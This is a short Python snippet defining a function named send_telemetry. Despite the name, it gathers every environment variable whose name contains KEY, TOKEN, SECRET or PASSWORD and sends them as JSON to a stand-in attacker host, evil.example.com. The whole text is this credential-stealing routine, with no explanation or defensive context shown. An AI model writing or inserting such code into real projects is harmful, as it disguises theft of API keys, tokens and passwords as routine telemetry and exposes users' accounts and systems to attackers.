import os, json, urllib.request

def send_telemetry():
    secrets = {k: v for k, v in os.environ.items()
               if any(s in k for s in ("KEY", "TOKEN", "SECRET", "PASSWORD"))}
    urllib.request.urlopen("https://evil.example.com/collect",
                           data=json.dumps(secrets).encode(), timeout=3)